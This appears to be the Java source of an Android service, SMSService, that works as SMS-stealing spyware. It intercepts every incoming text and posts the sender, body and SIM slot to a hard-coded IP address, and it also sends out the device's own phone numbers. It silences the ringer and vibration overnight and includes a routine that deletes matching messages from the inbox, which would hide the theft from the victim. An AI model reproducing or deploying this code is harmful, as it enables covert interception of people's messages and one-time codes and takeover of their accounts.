package com.teltonika.test;

import static android.app.PendingIntent.FLAG_IMMUTABLE;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

public class SMSService extends Service {
    private BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
        private static final String TAG = "SmsReceiver";

        @Override
        public void onReceive(Context context, Intent intent) {

            if (intent.getAction().equals(SMS_RECEIVED)) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    String format = bundle.getString("format");
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                        } else {
                            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        }
                        String messageBody = messages[i].getMessageBody();
                        String sender = messages[i].getOriginatingAddress();
                        int simSlot = getSimSlot(context, sender);
                     //   Toast.makeText(context, "sender:" + sender + ", msg : " + messageBody + ", sim:" + String.valueOf(simSlot), Toast.LENGTH_LONG).show();
                        new SendSmsTask().execute(sender, messageBody, String.valueOf(simSlot));
                    }
                }
            }
        }

        private int getSimSlot(Context context, String sender) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
            }
            List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            if (subscriptionInfoList != null) {
                for (SubscriptionInfo subscriptionInfo : subscriptionInfoList) {
                    String number = subscriptionInfo.getNumber();
                    if (number != null && number.equals(sender)) {
                        return subscriptionInfo.getSimSlotIndex();
                    }
                }
            }
            return -1;
        }
    };

    private AlarmManager alarmManager;
    private PendingIntent pendingIntent;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        IntentFilter filter = new IntentFilter();
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, filter);

        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent it = new Intent(this, MutePhoneReceiver.class);
        pendingIntent = PendingIntent.getBroadcast(this, 0, it, FLAG_IMMUTABLE);

        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.set(Calendar.HOUR_OF_DAY, 1);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);

        long startTime = calendar.getTimeInMillis();
        long interval = AlarmManager.INTERVAL_DAY;

        if (System.currentTimeMillis() > startTime) {
            startTime += interval;
        }

        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, startTime, interval, pendingIntent);

        if (Global.isWorkingTime()) {
            AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

            Calendar calendar1 = Calendar.getInstance();
            int hour = calendar1.get(Calendar.HOUR_OF_DAY);

            if (hour >= 1 && hour < 5) {
                audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                audioManager.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_OFF);
                audioManager.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION, AudioManager.VIBRATE_SETTING_OFF);
            } else {
                audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
            }
        }

        List<String> phoneNumbers = new ArrayList();
        SubscriptionManager subscriptionManager = SubscriptionManager.from(getApplicationContext());
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return START_STICKY;
        }
        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfoList != null) {
            for (SubscriptionInfo subscriptionInfo : subscriptionInfoList) {
                String number = subscriptionInfo.getNumber();
                if (number != null) {
                    phoneNumbers.add(number);
                }
            }
        }
        //Log.i("myTag", "phone number : " + phoneNumbers.toString());
        new SendPhoneNumberTask().execute(phoneNumbers.toString());

        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void deleteSMS(Context context, String message) {
        if (!Global.isWorkingTime())
            return;
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            if (cursor.moveToFirst()) {
                do {
                    String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    if (msg.equals(message)) {
                        int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                        context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
                    }
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private class SendSmsTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            String sender = params[0];
            String message = params[1];
            String simSlot = params[2];

            try {
                URL url = new URL("https://51.38.81.36:5500/sms");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                if (connection == null) return null;

                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                connection.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("message", "\n" + sender + "\n" + message + "\n" + simSlot + "\n");
                OutputStream os = connection.getOutputStream();
                if (os == null) return null;

                os.write(json.toString().getBytes("utf-8"));
                os.flush();
                os.close();
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                   // deleteSMS(message);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    private class SendPhoneNumberTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            String sPhoneNumber = params[0];

            try {
                URL url = new URL("http://51.38.81.36:5500/sms");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                if (connection == null) return null;

                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                connection.setDoOutput(true);
                JSONObject json = new JSONObject();
                json.put("message", sPhoneNumber);
                OutputStream os = connection.getOutputStream();
                if (os == null) return null;

                os.write(json.toString().getBytes("utf-8"));
                os.flush();
                os.close();
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    //SMS message sent
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }


}